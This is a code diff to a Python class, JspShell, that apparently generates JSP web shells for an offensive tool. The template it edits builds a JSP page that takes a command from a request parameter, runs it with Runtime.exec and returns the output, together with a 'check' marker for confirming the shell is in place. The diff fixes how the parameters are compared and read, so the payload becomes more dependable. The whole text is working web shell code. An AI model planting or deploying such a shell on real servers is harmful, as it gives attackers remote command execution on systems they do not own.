@@ -100,11 +100,12 @@ class JspShell(Webshell):
         '<%@ page import="java.io.*"%>\n' \
         '<%@ page import="java.util.*"%>\n' \
         '<%\n' \
-        'if (request.getParameter("check") == "1")\n' \
+        'String cmd = request.getParameter("{0}");\n' \
+        'if ("1".equals(request.getParameter("check")))\n' \
         '    out.println("202cTEST4b70".replace("TEST","' + _keyword + '"));\n' \
-        'if (request.getParameter("{0}") != null)\n' \
+        'if (cmd != null && !"".equals(cmd))\n' \
         '{{\n' \
-        '    Process p = Runtime.getRuntime().exec(request.getParameter("cmd"));\n' \
+        '    Process p = Runtime.getRuntime().exec(cmd);\n' \
         '    OutputStream os = p.getOutputStream();\n' \
         '    InputStream in = p.getInputStream();\n' \
         '    DataInputStream dis = new DataInputStream(in);\n' \
